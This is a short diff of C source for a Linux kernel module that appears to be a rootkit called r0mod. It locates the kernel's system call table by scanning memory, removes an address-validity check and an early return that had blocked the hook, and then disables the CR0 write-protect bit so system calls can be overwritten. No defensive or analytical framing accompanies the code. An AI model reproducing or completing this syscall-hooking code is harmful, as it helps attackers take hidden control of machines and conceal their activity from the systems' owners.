@@ -5,13 +5,12 @@
 #include <linux/unistd.h>   // syscalls
 #include <linux/syscalls.h> // syscalls
 
-#include <asm/page.h>
 #include <asm/paravirt.h>   // write_cr0
 
 #include <r0mod/global.h>
 
 #define SEARCH_START    PAGE_OFFSET
-#define SEARCH_END      0xffffffffffff
+#define SEARCH_END      PAGE_OFFSET + 0xffffffff
 
 unsigned long *syscall_table;
 
@@ -63,12 +62,6 @@ unsigned long *find_sys_call_table(void)
     {
         unsigned long *sys_call_table = (unsigned long *)i;
 
-        if(!virt_addr_valid(i - 0x1))
-        {
-            printk("Invalid!\n");
-            return NULL;
-        }
-
         if(sys_call_table[__NR_close] == (unsigned long)sys_close)
         {
             printk("sys_call_table found @ %lx\n", (unsigned long)sys_call_table);
@@ -98,8 +91,6 @@ static int __init r0mod_init(void)
     }
 
     printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);
-
-    return -1;
 
     write_cr0(read_cr0() & (~0x10000));
 
